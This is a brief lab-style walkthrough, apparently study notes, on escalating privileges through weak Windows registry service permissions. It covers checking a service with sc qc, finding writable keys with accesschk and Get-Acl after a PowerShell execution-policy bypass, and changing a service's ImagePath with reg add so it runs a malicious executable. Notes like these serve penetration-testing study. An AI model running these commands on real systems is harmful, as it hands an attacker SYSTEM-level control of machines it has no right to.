The Windows Registry stores configuration settings for services and applications. 
Weak permissions on registry keys can allow an attacker to modify settings used by privileged processes.

Think about the Registry as the `/etc` directory on linux, and the registry keys as `/etc/ssh` and the registry values as `port 22` when you do the `nano /etc/ssh` command 

How It’s Exploited: 
Attackers alter registry values (e.g., service executable paths) to point to malicious code, escalating privileges when the modified service or application runs.


_Walkthrough_

Using the command ` sc qc servicename `, you can check the service info and see if it is running with some privileges
If there's a `SYSTEM privilege (SERVICE_START_NAME)`, it confirms it is running with a privilege

detection 
1. C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\servicename
   or run 
2. a. powershell -ep bypass
   b.Get-Acl -Path hklm:\System\CurrentControlSet\services\servicename | fl



Exploitation
1. reg add HKLM\SYSTEM\CurrentControlSet\services\servicename /v ImagePath /t REG_EXPAND_SZ /d C:\users\user\esc.exe /f
